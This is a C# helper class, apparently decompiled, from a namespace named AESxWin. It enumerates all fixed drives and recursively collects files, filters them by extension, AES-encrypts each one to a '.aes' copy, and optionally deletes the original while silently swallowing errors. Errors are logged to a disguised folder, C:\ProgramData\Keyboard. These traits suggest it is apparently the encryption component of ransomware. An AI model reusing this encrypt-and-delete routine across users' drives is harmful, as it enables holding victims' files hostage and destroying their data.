using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using SharpAESCrypt;

namespace AESxWin.Helpers;

public static class FilesHelper
{
	public static async Task EncryptFileAsync(this string string_0, string string_1)
	{
		await Task.Run(delegate
		{
			global::SharpAESCrypt.SharpAESCrypt.Encrypt(string_1, string_0, string_0 + ".aes");
		});
	}

	public static void EncryptFileAsync(this string string_0, string string_1, bool bool_0)
	{
		try
		{
			global::SharpAESCrypt.SharpAESCrypt.Encrypt(string_1, string_0, string_0 + ".aes");
			if (bool_0)
			{
				try
				{
					File.Delete(string_0);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception ex)
		{
			string text = DateTime.Now.ToString("ddMMyyyy");
			string string_2 = Path.Combine("C:\\ProgramData\\Keyboard", text + ".error");
			Log.WriteLog(string_2, ex.ToString());
		}
	}

	public static async Task EncryptFilesAsync(this IEnumerable<string> paths, string string_0)
	{
		await Task.Run(async delegate
		{
			foreach (string path in paths)
			{
				await path.EncryptFileAsync(string_0);
				TextBoxLogHelper.Log(path + " Encrypted.");
			}
		});
	}

	public static async Task DecryptFileAsync(this string string_0, string string_1)
	{
		string outputpath = string_0.RemoveExtension();
		await Task.Run(delegate
		{
			global::SharpAESCrypt.SharpAESCrypt.Decrypt(string_1, string_0, outputpath);
		});
	}

	public static string RemoveExtension(this string string_0)
	{
		return Path.ChangeExtension(string_0, "")!.TrimEnd(new char[1] { '.' });
	}

	public static async Task DecryptFilesAsync(this IEnumerable<string> paths, string string_0)
	{
		await Task.Run(async delegate
		{
			foreach (string path in paths)
			{
				await path.DecryptFileAsync(string_0);
			}
		});
	}

	public static IEnumerable<string> GetFolderFilesPaths(this string string_0, bool bool_0 = true)
	{
		List<string> list = new List<string>();
		try
		{
			if (!Directory.Exists(string_0))
			{
				return list;
			}
			if (bool_0)
			{
				string[] directories = Directory.GetDirectories(string_0);
				if (directories != null)
				{
					string[] array = directories;
					foreach (string string_ in array)
					{
						list.AddRange(string_.GetFolderFilesPaths());
					}
				}
			}
			string[] files = Directory.GetFiles(string_0);
			if (files != null)
			{
				list.AddRange(files);
			}
		}
		catch
		{
		}
		return list;
	}

	public static IEnumerable<string> ParseExtensions(this string string_0)
	{
		List<string> list = new List<string>();
		string value = Regex.Match(string_0, "\\(.+\\)").Value;
		if (!string.IsNullOrWhiteSpace(value))
		{
			string_0 = string_0.Replace(value, string.Empty);
		}
		MatchCollection matchCollection = Regex.Matches(string_0, "\\b(\\w+)\\b");
		foreach (object item in matchCollection)
		{
			list.Add("." + item.ToString());
		}
		return list;
	}

	public static bool CheckExtension(this string string_0, IEnumerable<string> extensions)
	{
		if (extensions == null)
		{
			return true;
		}
		if (extensions.Count() == 0)
		{
			return true;
		}
		foreach (string extension in extensions)
		{
			if (string_0.ToLower().EndsWith(extension.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	public static bool CheckExtension(this string string_0, string[] string_1)
	{
		if (string_1 == null)
		{
			return true;
		}
		if (string_1.Count() == 0)
		{
			return true;
		}
		foreach (string text in string_1)
		{
			try
			{
				if (string_0.ToLower().EndsWith(text.ToLower()))
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	public static DriveInfo[] GetDrives()
	{
		IEnumerable<DriveInfo> enumerable = from driveInfo_0 in DriveInfo.GetDrives()
			where driveInfo_0.DriveType == DriveType.Fixed
			select driveInfo_0;
		if (enumerable != null && enumerable.Any())
		{
			return enumerable.ToArray();
		}
		return null;
	}
}
